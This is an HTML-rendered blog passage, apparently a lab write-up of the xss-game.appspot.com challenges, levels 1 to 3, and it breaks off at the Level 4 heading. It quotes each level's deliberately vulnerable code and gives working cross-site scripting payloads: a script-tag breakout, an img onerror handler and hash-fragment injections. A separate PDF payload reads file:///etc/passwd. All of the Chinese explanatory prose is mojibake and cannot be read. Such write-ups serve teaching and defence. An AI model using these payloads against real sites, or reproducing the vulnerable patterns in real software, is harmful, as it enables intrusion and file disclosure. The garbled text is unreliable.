<h3 id="pdf-xss">pdf xss<a hidden class="anchor" aria-hidden="true" href="#pdf-xss">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">x</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(){document.<span style="color:#a6e22e">write</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>)};<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;GET&#39;</span>,<span style="color:#e6db74">&#39;file:///etc/passwd&#39;</span>);<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">send</span>();&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><h2 id="ä¸Šçš„6ä¸ªxssæŒ‘æˆ˜"><a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a> ä¸Šçš„6ä¸ªxssæŒ‘æˆ˜<a hidden class="anchor" aria-hidden="true" href="#ä¸Šçš„6ä¸ªxssæŒ‘æˆ˜">#</a></h2>
<h3 id="level-1-hello-world-of-xss">Level 1: Hello, world of XSS<a hidden class="anchor" aria-hidden="true" href="#level-1-hello-world-of-xss">#</a></h3>
<p>ç½‘é¡µæºç ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>page_header <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;!doctype html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;script src=&#34;/static/game-frame.js&#34;&gt;&lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/game-frame-styles.css&#34; /&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;/head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;body id=&#34;level1&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;img src=&#34;/static/logos/level1.png&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>page_footer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;/body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>main_page_markup <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;form action=&#34;&#34; method=&#34;GET&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;input id=&#34;query&#34; name=&#34;query&#34; value=&#34;Enter query here...&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    onfocus=&#34;this.value=&#39;&#39;&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;input id=&#34;button&#34; type=&#34;submit&#34; value=&#34;Search&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/form&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MainPage</span>(webapp<span style="color:#f92672">.</span>RequestHandler):
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render_string</span>(self, s):
</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>response<span style="color:#f92672">.</span>out<span style="color:#f92672">.</span>write(s)
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Disable the reflected XSS filter for demonstration purposes</span>
</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>response<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>add_header(<span style="color:#e6db74">&#34;X-XSS-Protection&#34;</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;query&#39;</span>):
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># Show main search page</span>
</span></span><span style="display:flex;"><span>      self<span style="color:#f92672">.</span>render_string(page_header <span style="color:#f92672">+</span> main_page_markup <span style="color:#f92672">+</span> page_footer)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>      query <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;query&#39;</span>, <span style="color:#e6db74">&#39;[empty]&#39;</span>)
</span></span><span style="display:flex;"><span>       
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># Our search engine broke, we found no results :-(</span>
</span></span><span style="display:flex;"><span>      message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Sorry, no results were found for &lt;b&gt;&#34;</span> <span style="color:#f92672">+</span> query <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/b&gt;.&#34;</span>
</span></span><span style="display:flex;"><span>      message <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; &lt;a href=&#39;?&#39;&gt;Try again&lt;/a&gt;.&#34;</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># Display the results page</span>
</span></span><span style="display:flex;"><span>      self<span style="color:#f92672">.</span>render_string(page_header <span style="color:#f92672">+</span> message <span style="color:#f92672">+</span> page_footer)
</span></span><span style="display:flex;"><span>     
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>application <span style="color:#f92672">=</span> webapp<span style="color:#f92672">.</span>WSGIApplication([ (<span style="color:#e6db74">&#39;.*&#39;</span>, MainPage), ], debug<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span></code></pre></div><p>é»˜è®¤æœç´¢å¼•æ“æŸåï¼Œæ ¹æ®queryçš„ä¼ å‚å€¼ï¼Œè¿”å›messageã€‚ç›®æ ‡æ˜¯åˆ©ç”¨XSSå¼¹å‡ºå¼¹æ¡†ï¼Œåªéœ€å°†å‰åçš„æ ‡ç­¾<code>&lt;b&gt;</code>é—­åˆå³å¯ï¼š</p>
<pre tabindex="0"><code>?query=&lt;/b&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&lt;b&gt;
</code></pre><p>è¿™æ ·åµŒå…¥é¡µé¢çš„ä»£ç å°±æ˜¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>page_header + &#34;Sorry, no results were found for &lt;<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">b</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;XSS&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">b</span>&gt;. &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;?&#39;</span>&gt;Try again&lt;/<span style="color:#f92672">a</span>&gt;.&#34; + page_footer
</span></span></code></pre></div><hr>
<h3 id="level-2-persistence-is-key">Level 2: Persistence is key<a hidden class="anchor" aria-hidden="true" href="#level-2-persistence-is-key">#</a></h3>
<p>index.htmlä¸­æ¯”è¾ƒå…³é”®çš„æ˜¯è¿™æ®µå‡½æ•°çš„å®šä¹‰ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>Â Â Â Â Â Â <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">displayPosts</span>() {
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">containerEl</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;post-container&#34;</span>);
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â <span style="color:#a6e22e">containerEl</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>Â 
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">posts</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">DB</span>.<span style="color:#a6e22e">getPosts</span>();
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">posts</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;table class=&#34;message&#34;&gt; &lt;tr&gt; &lt;td valign=top&gt; &#39;</span>
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â Â Â <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;img src=&#34;/static/level2_icon.png&#34;&gt; &lt;/td&gt; &lt;td valign=top &#39;</span>
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â Â Â <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; class=&#34;message-container&#34;&gt; &lt;div class=&#34;shim&#34;&gt;&lt;/div&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>Â 
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â <span style="color:#a6e22e">html</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;b&gt;You&lt;/b&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â <span style="color:#a6e22e">html</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;span class=&#34;date&#34;&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">new</span> Date(<span style="color:#a6e22e">posts</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">date</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;/span&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â <span style="color:#a6e22e">html</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&lt;blockquote&gt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">posts</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">message</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/blockquote&#34;</span>;
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â <span style="color:#a6e22e">html</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#34;</span>
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â <span style="color:#a6e22e">containerEl</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">html</span>; 
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â }
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â }
</span></span><span style="display:flex;"><span>Â 
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â window.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() { 
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;clear-form&#39;</span>).<span style="color:#a6e22e">onsubmit</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â <span style="color:#a6e22e">DB</span>.<span style="color:#a6e22e">clear</span>(<span style="color:#66d9ef">function</span>() { <span style="color:#a6e22e">displayPosts</span>() });
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â }
</span></span><span style="display:flex;"><span>Â 
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;post-form&#39;</span>).<span style="color:#a6e22e">onsubmit</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;post-content&#39;</span>).<span style="color:#a6e22e">value</span>;
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â <span style="color:#a6e22e">DB</span>.<span style="color:#a6e22e">save</span>(<span style="color:#a6e22e">message</span>, <span style="color:#66d9ef">function</span>() { <span style="color:#a6e22e">displayPosts</span>() } );
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;post-content&#39;</span>).<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â }
</span></span><span style="display:flex;"><span>Â 
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â <span style="color:#a6e22e">displayPosts</span>();
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â }
</span></span><span style="display:flex;"><span>Â 
</span></span></code></pre></div><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å°†è¾“å…¥æ¡†ä¸­ç”¨æˆ·è¾“å…¥çš„å†…å®¹é€šè¿‡<code>innerHTML</code>åŠ¨æ€åŠ è½½åˆ°é¡µé¢ï¼ŒæŸ¥é˜…innerHTMLçš„<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML">æ–‡æ¡£</a>å¯çŸ¥ï¼ŒHTML 5 ä¸­æŒ‡å®šä¸æ‰§è¡Œç”± <code>innerHTML</code> æ’å…¥çš„<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œå› æ­¤æœ¬é¢˜æ— æ³•ç®€å•åœ°åˆ©ç”¨<code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>æ¥å®ç°XSS</p>
<p>æ–‡æ¡£ä¸­ä»‹ç»äº†ä¸€æ¡ä¸ä¾èµ–scriptæ ‡ç­¾æ¥æ‰§è¡ŒJavaScriptçš„æ–¹æ³•ï¼Œå…‰ç”¨innerHTMLæ˜¯æ— æ³•é¿å…XSSæ”»å‡»çš„ï¼š</p>
<pre tabindex="0"><code>&lt;/blockquote&gt;&lt;img src=&#39;x&#39; onerror=&#34;alert(&#39;XSS&#39;)&#34;&gt;&lt;blockquote&gt;
</code></pre><p>æ–‡æ¡£ä¸­ä¹Ÿç»™å‡ºäº†å®‰å…¨å»ºè®®ï¼Œä½¿ç”¨Node.textContentï¼Œå®ƒä¸ä¼šæŠŠç»™å®šçš„å†…å®¹è§£æä¸º HTMLï¼Œå®ƒä»…ä»…æ˜¯å°†åŸå§‹æ–‡æœ¬æ’å…¥ç»™å®šçš„ä½ç½®</p>
<hr>
<h3 id="level-3-that-sinking-feeling">Level 3: That sinking feeling&hellip;<a hidden class="anchor" aria-hidden="true" href="#level-3-that-sinking-feeling">#</a></h3>
<p>index.htmlï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!doctype html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/game-frame-styles.css&#34;</span> /&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- Load jQuery --&gt;</span>
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">chooseTab</span>(<span style="color:#a6e22e">num</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Dynamically load the appropriate image.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Image &#34;</span> <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">num</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">html</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&lt;img src=&#39;/static/level3/cloud&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">num</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.jpg&#39; /&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#tabContent&#39;</span>).<span style="color:#a6e22e">html</span>(<span style="color:#a6e22e">html</span>);
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">num</span>;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Select the current tab
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tabs</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#39;.tab&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">tabs</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">tabs</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">id</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;tab&#34;</span> <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">num</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">tabs</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">className</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;tab active&#34;</span>;
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">tabs</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">className</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;tab&#34;</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Tell parent we&#39;ve changed the tab
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">top</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#a6e22e">self</span>.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">toString</span>(), <span style="color:#e6db74">&#34;*&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>      window.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() { 
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">chooseTab</span>(<span style="color:#a6e22e">unescape</span>(<span style="color:#a6e22e">self</span>.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">1</span>)) <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;1&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Extra code so that we can communicate with the parent page
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">event</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">source</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">parent</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">chooseTab</span>(<span style="color:#a6e22e">unescape</span>(<span style="color:#a6e22e">self</span>.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">1</span>)));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }, <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;level3&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;header&#34;</span>&gt;
</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;logo&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/logos/level3.png&#34;</span>&gt;
</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">span</span>&gt;Take a tour of our cloud data center.&lt;/<span style="color:#f92672">a</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tab&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tab1&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;chooseTab(&#39;1&#39;)&#34;</span>&gt;Image 1&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tab&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tab2&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;chooseTab(&#39;2&#39;)&#34;</span>&gt;Image 2&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tab&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tab3&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;chooseTab(&#39;3&#39;)&#34;</span>&gt;Image 3&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tabContent&#34;</span>&gt; &lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>æ¯æ¬¡åŠ è½½é¡µé¢éƒ½ä¼šè§¦å‘onloadï¼Œæˆªå–urlä¸­ä»#å¼€å§‹çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæ²¡æœ‰åˆ™ç›´æ¥æ‰§è¡ŒchooseTab(&ldquo;1&rdquo;)ï¼Œæ ¹æ®location.hashçš„å±æ€§å€¼å‘id=&ldquo;tabContent&quot;åŠ¨æ€æ’å…¥htmlä»£ç ï¼Œå®ç°é¡µé¢çš„åˆ‡æ¢å’Œå›¾ç‰‡çš„æ˜¾ç¤º</p>
<p>è§‚å¯Ÿåˆ°å¹¶æœªå¯¹location.hashè¿›è¡Œé™åˆ¶ï¼Œä¸”è¯¥å€¼å¯æ§ï¼Œç›´æ¥åˆ©ç”¨scriptæ ‡ç­¾å³å¯å®ç°XSSï¼š</p>
<pre tabindex="0"><code>1.jpg&#39; /&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&lt;!--
</code></pre><p>ä¹Ÿå¯ä»¥ä½¿ç”¨onerroræ¥å®ç°ï¼Œä½†æ˜¯æ— æ³•åŠ è½½å›¾ç‰‡ï¼š</p>
<pre tabindex="0"><code>1&#39; onerror=&#34;alert(&#39;XSS&#39;)&#34; x=
</code></pre><hr>
<h3 id="level-4-context-matters">Level 4: Context matters<a hidden class="anchor" aria-hidden="true" href="#level-4-context-matters">#</a></h3>
<p>timer.htmlï¼š</p>
